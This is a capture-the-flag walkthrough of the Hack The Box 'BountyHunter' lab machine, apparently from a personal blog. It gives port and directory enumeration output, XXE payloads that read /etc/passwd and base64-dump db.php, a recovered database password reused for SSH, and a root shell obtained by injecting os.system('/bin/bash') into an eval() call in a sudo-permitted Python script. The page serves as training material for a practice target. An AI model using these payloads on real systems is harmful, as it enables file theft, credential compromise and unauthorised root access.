---
layout: default
title: BOUNTY HUNTER
description: by Hack The Box
---

<h3 align="center">
BountyHunter is a linux machine that can be attack by getting a foothold on its webapp service.
</h3>

`Web Fuzzing`
`XXE`
`Linux`
`Web`
`Python`
`Source Code Review`
`Sudo Exploitation`

## Enumeration

1. Scan the machine for open ports using NMAP

   ```
   ┌──(schoon3r㉿nexer)-[~/Downloads]
   └─$ nmap 10.10.11.100 -A -T4                                                                                                                          255 ⨯
   Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-23 05:07 EST
   Nmap scan report for 10.10.11.100
   Host is up (0.035s latency).
   Not shown: 998 closed tcp ports (conn-refused)
   PORT   STATE SERVICE VERSION
   22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
   | ssh-hostkey:
   |   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
   |   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
   |_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
   80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
   |_http-title: Bounty Hunters
   |_http-server-header: Apache/2.4.41 (Ubuntu)
   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 8.28 seconds
   ```

2. SSH and HTTP is open
3. Check the browser if there's a website >> Yes there is!
4. Run FFUF with option -e php (since we know its a php site from the browser developer tools)

   ```
   ┌──(schoon3r㉿nexer)-[~/Downloads]
   └─$ ffuf -u http://10.10.11.100/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php                                                    1 ⨯

           /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
           \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
           \ \_\   \ \_\  \ \____/  \ \_\
           \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
   ________________________________________________

   :: Method           : GET
   :: URL              : http://10.10.11.100/FUZZ
   :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
   :: Extensions       : .php
   :: Follow redirects : false
   :: Calibration      : false
   :: Timeout          : 10
   :: Threads          : 40
   :: Matcher          : Response status: 200,204,301,302,307,401,403,405
   ________________________________________________

   .hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
   .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
   .hta.php                [Status: 403, Size: 277, Words: 20, Lines: 10]
   .htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
   .htaccess.php           [Status: 403, Size: 277, Words: 20, Lines: 10]
   .htpasswd.php           [Status: 403, Size: 277, Words: 20, Lines: 10]
   assets                  [Status: 301, Size: 313, Words: 20, Lines: 10]
   css                     [Status: 301, Size: 310, Words: 20, Lines: 10]
   db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1]
   index.php               [Status: 200, Size: 25169, Words: 10028, Lines: 389]
   index.php               [Status: 200, Size: 25169, Words: 10028, Lines: 389]
   js                      [Status: 301, Size: 309, Words: 20, Lines: 10]
   portal.php              [Status: 200, Size: 125, Words: 11, Lines: 6]
   resources               [Status: 301, Size: 316, Words: 20, Lines: 10]
   server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
   :: Progress: [9404/9404] :: Job [1/1] :: 1238 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
   ```

5. Not a lot of good with DIRB. Let's inspect the pages of the website using the browser's developer tools
6. The portal page contains a link that takes you to a CVE form. In this page, there is a custom JS file.
7. Looking at the custom JS file, it looks like it takes your to a URL 'tracker_diRbPr00f314.php'. Traversing this php page, it looks like it returns the value which you've input from the submission form. Might be vulneralbe with XXE (XML External Entity)
8. Let's test using burp by submitting something from the form.

## Grab Username and Password

9. Inspection the datagram from the the request... the decoded base64 seems like its ripe for XXE. We will try to use at this script.
   ```
   <?xml  version="1.0" encoding="ISO-8859-1"?><!DOCTYPE root [<!ENTITY schoon SYSTEM 'file:///etc/passwd'>]>
   	<bugreport>
   	<title>&schoon;</title>
   	<cwe></cwe>
   	<cvss></cvss>
   	<reward></reward>
   	</bugreport>
   ```
10. But this script will be encoded into base64 first then passed on the repeater of burp
11. We have it! The response from burp is the content of the /etc/passwd file

    ```
    HTTP/1.1 200 OK

    Date: Tue, 23 Nov 2021 10:55:19 GMT

    Server: Apache/2.4.41 (Ubuntu)

    Vary: Accept-Encoding

    Content-Length: 2090

    Connection: close

    Content-Type: text/html; charset=UTF-8



    If DB were ready, would have added:
    <table>
    <tr>
        <td>Title:</td>
        <td>root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
    systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
    messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
    syslog:x:104:110::/home/syslog:/usr/sbin/nologin
    _apt:x:105:65534::/nonexistent:/usr/sbin/nologin
    tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
    uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
    tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
    landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
    pollinate:x:110:1::/var/cache/pollinate:/bin/false
    sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
    development:x:1000:1000:Development:/home/development:/bin/bash
    lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
    usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
    </td>
    </tr>
    <tr>
        <td>CWE:</td>
        <td></td>
    </tr>
    <tr>
        <td>Score:</td>
        <td></td>
    </tr>
    <tr>
        <td>Reward:</td>
        <td></td>
    </tr>
    </table>
    ```

12. So we have user 'development'. And because we now have proved that interact with the server...
13. Let's try and run a php payload
    ```
    <?xml version="1.0"?>
    <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=db.php">]>
            <bugreport>
            <title>&xxe;</title>
            <cwe>no</cwe>
            <reward>1337</reward>
            </bugreport>
    ```
14. Encode that payload to base64 and pass it in the request of the burp repeater watch the response
15. We now have the $dbpassword
    ```
    <?php
    // TODO -> Implement login system with the database.
    $dbserver = "localhost";
    $dbname = "bounty";
    $dbusername = "admin";
    $dbpassword = "m19RoAU0hP41A1sTsq6K";
    $testuser = "test";
    ?>
    ```
16. Let's use this to SSH into the machine

    ```
    ssh development@10.10.11.100

    (password)
    ```

## Let's try to PrivEsc

17. Let's look at the capability of your user shell

    ```
    development@bountyhunter:~$ sudo -l
        Matching Defaults entries for development on bountyhunter:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User development may run the following commands on bountyhunter:
        (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
    ```

18. Let's look at that python file >> ticketValidator.py

    ```
    development@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py
    #Skytrain Inc Ticket Validation System 0.1
    #Do not distribute this file.

    def load_file(loc):
        if loc.endswith(".md"):
            return open(loc, 'r')
        else:
            print("Wrong file type.")
            exit()

    def evaluate(ticketFile):
        #Evaluates a ticket to check for ireggularities.
        code_line = None
        for i,x in enumerate(ticketFile.readlines()):
            if i == 0:
                if not x.startswith("# Skytrain Inc"):
                    return False
                continue
            if i == 1:
                if not x.startswith("## Ticket to "):
                    return False
                print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
                continue

            if x.startswith("__Ticket Code:__"):
                code_line = i+1
                continue

            if code_line and i == code_line:
                if not x.startswith("**"):
                    return False
                ticketCode = x.replace("**", "").split("+")[0]
                if int(ticketCode) % 7 == 4:
                    validationNumber = eval(x.replace("**", ""))
                    if validationNumber > 100:
                        return True
                    else:
                        return False
        return False

    def main():
        fileName = input("Please enter the path to the ticket file.\n")
        ticket = load_file(fileName)
        #DEBUG print(ticket)
        result = evaluate(ticket)
        if (result):
            print("Valid ticket.")
        else:
            print("Invalid ticket.")
        ticket.close

    main()
    ```

19. This python script checks for a MD file, so let's create an MD file like below

    ```
    (go to tmp directory first so we can write stuff)
    cd /tmp/

    vim schoon.md

    (enter below code to VIM)
    # Skytrain Inc
    ## Ticket to root
    __Ticket Code:__
    **102+ 10 == 112 and __import__('os').system('/bin/bash') == False

    (save and exit)
    ```

20. Execute the python code

    ```
    development@bountyhunter:/tmp$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
    Please enter the path to the ticket file.
    schoon.md
    Destination: root

    root@bountyhunter:/tmp# ls
    file.md
    systemd-private-0bd912db501f44f39b85195cd581656e-apache2.service-o7XTXg
    systemd-private-0bd912db501f44f39b85195cd581656e-systemd-logind.service-RsZRBg
    systemd-private-0bd912db501f44f39b85195cd581656e-systemd-resolved.service-8O5wfi
    systemd-private-0bd912db501f44f39b85195cd581656e-systemd-timesyncd.service-c2H7tj
    vmware-root_658-2697598381

    root@bountyhunter:/tmp# ls ~
    root.txt  snap

    root@bountyhunter:/tmp# cat ~/root.txt
    b6b97c6ddec32f72ea990ca224aa0ae4
    ```

Reference:

1. https://l33t-en0ugh.gitbook.io/infosec/hackthebox/bountyhunter-easy
2. https://github.com/payloadbox/xxe-injection-payload-list
3. https://portswigger.net/web-security/xxe
4. https://www.youtube.com/watch?v=gjm6VHZa_8s

<br><br>

[back to HOME](./)
